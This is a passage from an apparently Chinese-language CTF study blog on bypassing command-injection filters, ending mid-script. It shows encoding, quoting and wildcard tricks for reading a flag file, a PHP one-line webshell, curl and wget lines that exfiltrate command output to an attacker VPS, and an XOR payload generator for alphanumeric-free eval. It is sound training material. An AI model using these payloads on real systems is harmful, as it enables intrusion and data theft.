fl\"a\"g</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><ol start=\"3\">\n<li><strong>HEX 编码绕过</strong></li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">###</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token builtin class-name\">printf</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\154\">\\154</span><span class=\"token entity\" title=\"\\163\">\\163</span>\"</span><span class=\"token variable\">)</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token builtin class-name\">printf</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\x63\">\\x63</span><span class=\"token entity\" title=\"\\x61\">\\x61</span><span class=\"token entity\" title=\"\\x74\">\\x74</span><span class=\"token entity\" title=\"\\x20\">\\x20</span><span class=\"token entity\" title=\"\\x2f\">\\x2f</span><span class=\"token entity\" title=\"\\x66\">\\x66</span><span class=\"token entity\" title=\"\\x6c\">\\x6c</span><span class=\"token entity\" title=\"\\x61\">\\x61</span><span class=\"token entity\" title=\"\\x67\">\\x67</span>\"</span><span class=\"token variable\">)</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span>printf,<span class=\"token string\">\"<span class=\"token entity\" title=\"\\x63\">\\x63</span><span class=\"token entity\" title=\"\\x61\">\\x61</span><span class=\"token entity\" title=\"\\x74\">\\x74</span><span class=\"token entity\" title=\"\\x20\">\\x20</span><span class=\"token entity\" title=\"\\x2f\">\\x2f</span><span class=\"token entity\" title=\"\\x66\">\\x66</span><span class=\"token entity\" title=\"\\x6c\">\\x6c</span><span class=\"token entity\" title=\"\\x61\">\\x61</span><span class=\"token entity\" title=\"\\x67\">\\x67</span>\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token variable\">$0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">###</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># $(printf \"\\x63\\x61\\x74\\x20\\x66\\x6c\\x61\\x67\")</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><ol start=\"4\">\n<li><strong>base64 编码绕过</strong></li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># echo Y2F0IGZsYWc=|base64 -d|sh</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><ol start=\"5\">\n<li><strong>反引号绕过</strong></li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># cat fl`a`ag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a: <span class=\"token builtin class-name\">command</span> not found</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><ol start=\"6\">\n<li><strong>反斜杠绕过</strong></li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># cat f\\lag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><ol start=\"7\">\n<li><strong>读取文件绕过</strong></li>\n</ol>\n<p>当 <code>cat</code>  被过滤时</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>more:一页一页的显示档案内容</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>less:与 <span class=\"token function\">more</span> 类似，但是比 <span class=\"token function\">more</span> 更好的是，他可以<span class=\"token punctuation\">[</span>pg dn<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>pg up<span class=\"token punctuation\">]</span>翻页</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>head:查看头几行</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>tac:从最后一行开始显示，可以看出 <span class=\"token function\">tac</span> 是 <span class=\"token function\">cat</span> 的反向显示</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>tail:查看尾几行</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>nl：显示的时候，顺便输出行号</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>od:以二进制的方式读取档案内容</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>vi:一种编辑器，这个也可以查看</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>vim:一种编辑器，这个也可以查看</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sort:可以查看</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>uniq:可以查看</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">file</span> -f:报错出具体内容</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># more flag</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><ol start=\"8\">\n<li><code>$1、$2等和$@</code></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@<span class=\"token constant\">VM</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>ubuntu<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token comment\"># c$1at flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>root@<span class=\"token constant\">VM</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>ubuntu<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token comment\"># cat fl$@ag</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><h4 id=\"通配符绕过\"><a class=\"anchor\" href=\"#通配符绕过\">#</a> 通配符绕过</h4>\n<p><code>?</code>  代表一个字符</p>\n<p><code>*</code>  代表一串字符</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># /???/?at flag\t#/bin 目录下的 cat</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># /???/?at f*\t\t#/bin 目录下的 cat 查询所有带有 f 开头的文件</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><p>当初学到这个姿势时也是惊呆了，真的长见识了 wwww</p>\n<h4 id=\"内敛执行绕过\"><a class=\"anchor\" href=\"#内敛执行绕过\">#</a> 内敛执行绕过</h4>\n<p><code>命令</code> 和 <code>$(命令)</code>  都是执行命令的方式</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># echo \"more`cat flag`\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>moreyou are good<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># echo \"more $(cat flag)\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">more</span> you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><h4 id=\"长度限制绕过\"><a class=\"anchor\" href=\"#长度限制绕过\">#</a> 长度限制绕过</h4>\n<ol>\n<li>\n<p><strong> <code>&gt;</code>  和 <code>&gt;&gt;</code>  两个符号的使用</strong></p>\n<p>使用  <code>&gt;</code>  命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># echo \"cat flag\" > 1.php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># sh 1.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><p>使用  <code>&gt;&gt;</code>  则会将字符串添加至文件内容末尾，不会覆盖原内容</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># echo \"haha\" >> 1.php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># cat 1.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">cat</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>haha</pre></td></tr></table></figure></li>\n<li>\n<p><strong>命令换行</strong></p>\n</li>\n</ol>\n<p>换行执行命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># ca\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">></span> t<span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">></span>  fl<span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">></span> ag</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><p>也可以写一个 php 文件来执行命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># echo \"ca\\\\\">3.php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># echo \"t\\\\\">>3.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># echo \" fl\\\\\">>3.php</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># echo \"ag\">>3.php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># cat 3.php</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ca<span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>t<span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> fl<span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>ag</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># sh 3.php</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><h3 id=\"无回显rce\"><a class=\"anchor\" href=\"#无回显rce\">#</a> 无回显 RCE</h3>\n<ol>\n<li>\n<p>要是输入系统命令没有值回显，就可能是无回显的 RCE，我们可以用 <code>ls;sleep(5);</code>  测试是否会执行我们的 sleep 指令，如能执行则进行下一步，对其进行各种权限的测试</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>copy flag <span class=\"token number\">1</span>.txt <span class=\"token comment\">#复制</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">mv</span> flag <span class=\"token number\">1</span>.txt\t<span class=\"token comment\">#移动</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">cat</span> flag <span class=\"token operator\">></span> <span class=\"token number\">1</span>.txt\t<span class=\"token comment\">#写入</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tar</span> zcvf flag.tar.gz flag\t<span class=\"token comment\">#压缩</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"&lt;?php @eval(<span class=\"token variable\">$_POST</span>['K1nako']);?>\"</span> <span class=\"token operator\">></span> webshell.php <span class=\"token comment\">#一句话木马</span></pre></td></tr></table></figure></li>\n<li>\n<p>用  <code>vps</code>  建立记录脚本</p>\n<p>利用自己的服务器建立一个 <code>rap.php</code>  的文件，写入如下代码</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> fopen<span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.txt\"</span>, <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>fwrite<span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span>,<span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>fclose<span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?<span class=\"token operator\">></span></pre></td></tr></table></figure><p>然后开始构造请求</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> http://*.*.*.*/rap.php?data<span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">cat</span> flag<span class=\"token variable\">`</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">wget</span> http://*.*.*.*/rap.php?data<span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">cat</span> flag<span class=\"token variable\">`</span></span></pre></td></tr></table></figure></li>\n</ol>\n<h5 id=\"例题-2\"><a class=\"anchor\" href=\"#例题-2\">#</a> 例题</h5>\n<p><strong>NSSCTF</strong></p>\n<p>[SWPUCTF 2021 新生赛] finalrce</p>\n<h3 id=\"无字母数字rce\"><a class=\"anchor\" href=\"#无字母数字rce\">#</a> 无字母数字 RCE</h3>\n<p>这里对于我这种小白来说太难理解了，这里借鉴了大佬们的脚本及思路</p>\n<p><strong>代码示例</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  error_reporting<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  highlight_file<span class=\"token punctuation\">(</span>__FILE__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  if<span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/[a-z0-9]/i'</span>,<span class=\"token variable\">$code</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      die<span class=\"token punctuation\">(</span><span class=\"token string\">'hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  eval<span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><strong>代码分析</strong></p>\n<p>接收一个 <code>code</code>  参数，进行一个正则匹配，匹配所有的字母和数字，匹配到就会返回一个  <code>hacker</code>  字符串且结束代码</p>\n<p>这里很明显需要我们绕过正则表达式运行 <code>eval</code>  函数执行我们的系统命令</p>\n<h4 id=\"异或\"><a class=\"anchor\" href=\"#异或\">#</a> <strong>异或</strong></h4>\n<p>首先利用如下脚本生成包含所有可见字符的异或构造结果</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$myfile</span> <span class=\"token operator\">=</span> fopen<span class=\"token punctuation\">(</span><span class=\"token string\">\"yihuo.txt\"</span>, <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span>++<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">&lt;</span><span class=\"token number\">256</span> <span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span>++<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        if<span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>          <span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token string\">'0'</span>.dechex<span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        else<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>          <span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span>dechex<span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        if<span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>          <span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token string\">'0'</span>.dechex<span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        else<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>          <span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span>dechex<span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$preg</span> <span class=\"token operator\">=</span> <span class=\"token string\">'/[a-z0-9]/i'</span><span class=\"token punctuation\">;</span> //根据题目给的正则表达式修改即可</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        if<span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> , hex2bin<span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">))</span><span class=\"token operator\">||</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> , hex2bin<span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>              <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        else<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>urldecode<span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span>^urldecode<span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ord<span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">32</span><span class=\"token operator\">&amp;</span>ord<span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          <span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token variable\">$contents</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$c</span><span class=\"token builtin class-name\">.</span><span class=\"token string\">\" \"</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$a</span><span class=\"token builtin class-name\">.</span><span class=\"token string\">\" \"</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$b</span><span class=\"token builtin class-name\">.</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    fwrite<span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span>,<span class=\"token variable\">$contents</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    fclose<span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>运行 python 脚本生成我们的 payload</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">import</span> urllib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>from sys <span class=\"token function\">import</span> *</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">import</span> os</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>def action<span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span>:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>       <span class=\"token assign-left variable\">s1</span><span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token assign-left variable\">s2</span><span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">i</span> <span class=\"token keyword\">in</span> arg:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>           <span class=\"token assign-left variable\">f</span><span class=\"token operator\">=</span>open<span class=\"token punctuation\">(</span><span class=\"token string\">\"yihuo.txt\"</span>,<span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>           <span class=\"token keyword\">while</span> True:</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>               <span class=\"token assign-left variable\">t</span><span class=\"token operator\">=</span>f.readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>               <span class=\"token keyword\">if</span> <span class=\"token assign-left variable\">t</span><span class=\"token operator\">==</span><span class=\"token string\">\"\"</span><span class=\"token builtin class-name\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                   <span class=\"token builtin class-name\">break</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>               <span class=\"token keyword\">if</span> t<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>i:</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                   <span class=\"token comment\">#print(i)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                   <span class=\"token assign-left variable\">s1</span><span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">2</span>:5<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                   <span class=\"token assign-left variable\">s2</span><span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">6</span>:9<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                   <span class=\"token builtin class-name\">break</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>           f.close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>       <span class=\"token assign-left variable\">output</span><span class=\"token operator\">=</span><span class=\"token string\">\"(<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>\"</span>+s1+<span class=\"token string\">\"<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>^<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>\"</span>+s2+<span class=\"token string\">\"<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>)\"</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>       return<span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>       </pre></td></tr><tr><td 